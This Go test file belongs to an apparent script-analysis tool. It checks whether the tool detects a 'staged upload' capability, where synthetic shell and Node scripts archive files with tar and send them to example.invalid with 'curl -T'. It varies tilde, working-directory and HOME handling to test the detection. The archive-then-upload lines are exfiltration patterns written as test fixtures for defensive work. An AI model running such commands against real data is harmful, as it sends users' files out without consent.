package report

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestInspectShellStagedFlowRequiresPathInterpretationAndDirectoryContext(t *testing.T) {
	for _, test := range []struct {
		name, before, output, between, input string
		flow                                 bool
	}{
		{name: "stable relative backup", output: "./inert.tgz", input: "inert.tgz", flow: true},
		{name: "literal tilde backup", output: "'~/inert.tgz'", input: "'~/inert.tgz'", flow: true},
		{name: "home relative backup", output: "~/inert.tgz", input: "~/inert.tgz", flow: true},
		{name: "home prefix quoted suffix", output: "~/\"inert.tgz\"", input: "~/inert.tgz", flow: true},
		{name: "quoted tilde differs from expansion", output: "'~/inert.tgz'", input: "~/inert.tgz"},
		{name: "escaped tilde differs from expansion", output: `\~/inert.tgz`, input: "~/inert.tgz"},
		{name: "empty quote suppresses home expansion", output: `~""/inert.tgz`, input: "~/inert.tgz"},
		{name: "dot tilde is literal", output: "./~/inert.tgz", input: "~/inert.tgz"},
		{name: "current directory tilde remains unresolved", output: "~+/inert.tgz", between: "cd /tmp/inert-other\n", input: "~+/inert.tgz"},
		{name: "literal dot tilde equivalence", output: "./~/inert.tgz", input: "'~/inert.tgz'", flow: true},
		{name: "working directory changes", output: "./inert.tgz", between: "cd /tmp/inert-other\n", input: "./inert.tgz"},
		{name: "conditional directory change", output: "./inert.tgz", between: "cd /tmp/inert-other || true\n", input: "./inert.tgz"},
		{name: "push directory", output: "./inert.tgz", between: "pushd /tmp/inert-other\n", input: "./inert.tgz"},
		{name: "pop directory", output: "./inert.tgz", between: "popd\n", input: "./inert.tgz"},
		{name: "new uncertain cwd stays stable", before: "cd /tmp/inert-other\n", output: "./inert.tgz", input: "inert.tgz", flow: true},
		{name: "absolute path survives cwd change", output: "/tmp/inert.tgz", between: "cd /tmp/inert-other\n", input: "/tmp/inert.tgz", flow: true},
		{name: "home unaffected by cwd", output: "~/inert.tgz", between: "cd /tmp/inert-other\n", input: "~/inert.tgz", flow: true},
		{name: "home assignment", output: "~/inert.tgz", between: "HOME=/tmp/inert-home\n", input: "~/inert.tgz"},
		{name: "export home", output: "~/inert.tgz", between: "export HOME=/tmp/inert-home\n", input: "~/inert.tgz"},
		{name: "unset home", output: "~/inert.tgz", between: "unset HOME\n", input: "~/inert.tgz"},
		{name: "cwd unaffected by home", output: "./inert.tgz", between: "HOME=/tmp/inert-home\n", input: "./inert.tgz", flow: true},
		{name: "quoted tilde unaffected by home", output: "'~/inert.tgz'", between: "HOME=/tmp/inert-home\n", input: "'~/inert.tgz'", flow: true},
		{name: "sourced file may change cwd", output: "./inert.tgz", between: ". /tmp/inert-settings\n", input: "./inert.tgz"},
		{name: "eval may change home", output: "~/inert.tgz", between: "eval unknown\n", input: "~/inert.tgz"},
		{name: "unknown function may change cwd", output: "./inert.tgz", between: "inert_helper\n", input: "./inert.tgz"},
		{name: "external executable cannot change parent cwd", output: "./inert.tgz", between: "/tmp/inert-helper\n", input: "./inert.tgz", flow: true},
		{name: "child shell cannot change parent cwd", output: "./inert.tgz", between: "sh -c 'cd /tmp/inert-other'\n", input: "./inert.tgz", flow: true},
		{name: "literal variable tilde stays literal", before: "p='~/inert.tgz'\n", output: `"$p"`, input: "~/inert.tgz"},
		{name: "literal variable same literal", before: "p='~/inert.tgz'\n", output: `"$p"`, input: "'~/inert.tgz'", flow: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "backup.sh")
			source := "#!/bin/sh\n" + test.before + "tar -czf " + test.output + " /tmp/inert-input\n" + test.between + "curl -T " + test.input + " https://example.invalid/upload\n"
			if err := os.WriteFile(path, []byte(source), 0o600); err != nil {
				t.Fatal(err)
			}
			one, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			archive, upload := false, false
			for _, operation := range one.Operations {
				archive = archive || operation.Kind == behavior.OperationArchiveCreate
				upload = upload || operation.Kind == behavior.OperationNetworkUpload
			}
			if !archive || !upload {
				t.Fatalf("path uncertainty hid an independent operation: %s\n%#v", source, one.Operations)
			}
			if got := hasCapability(one, "macos.upload-staged-data"); got != test.flow {
				t.Fatalf("staged flow = %v, want %v: %s\n%#v", got, test.flow, source, one.OperationRelations)
			}
			assertReportReferencesValid(t, one)
			if _, err := encodeAndDecodeReport(one); err != nil {
				t.Fatal(err)
			}
			two, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			var a, b bytes.Buffer
			if err := WriteJSON(&a, one); err != nil {
				t.Fatal(err)
			}
			if err := WriteJSON(&b, two); err != nil || !bytes.Equal(a.Bytes(), b.Bytes()) {
				t.Fatal("path-context report was nondeterministic")
			}
		})
	}
}

func TestInspectShellExpandedTildeAssignmentIsNotLiteral(t *testing.T) {
	path := filepath.Join(t.TempDir(), "backup.sh")
	source := "#!/bin/sh\np=~/inert.tgz\ntar -czf \"$p\" /tmp/inert-input\ncurl -T '~/inert.tgz' https://example.invalid/upload\n"
	if err := os.WriteFile(path, []byte(source), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.upload-staged-data") {
		t.Fatal("expanded assignment was retained as a literal tilde path")
	}
}

func TestInspectUnknownWritePreventsStagedFileAttribution(t *testing.T) {
	for _, test := range []struct {
		name, target string
		flow         bool
	}{
		{"unresolved target", "unknown", false},
		{"unrelated target", `"/tmp/inert-other"`, true},
		{"same target", `"/tmp/inert.tgz"`, false},
	} {
		t.Run(test.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "backup.js")
			source := "const cp=require('child_process');const fs=require('fs');\n" +
				"cp.execSync('tar -czf /tmp/inert.tgz /tmp/inert-input');\n" +
				"fs.writeFileSync(" + test.target + ", 'inert');\n" +
				"cp.execSync('curl -T /tmp/inert.tgz https://example.invalid/upload');\n"
			if err := os.WriteFile(path, []byte(source), 0o600); err != nil {
				t.Fatal(err)
			}
			rep, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			if got := hasCapability(rep, "macos.upload-staged-data"); got != test.flow {
				t.Fatalf("staged flow = %v, want %v: %#v\n%#v", got, test.flow, rep.Operations, rep.OperationRelations)
			}
			foundWrite := false
			for _, operation := range rep.Operations {
				foundWrite = foundWrite || operation.Kind == behavior.OperationFileWrite
			}
			if !foundWrite {
				t.Fatal("test did not retain the intervening write")
			}
			if _, err := encodeAndDecodeReport(rep); err != nil {
				t.Fatal(err)
			}
		})
	}
}
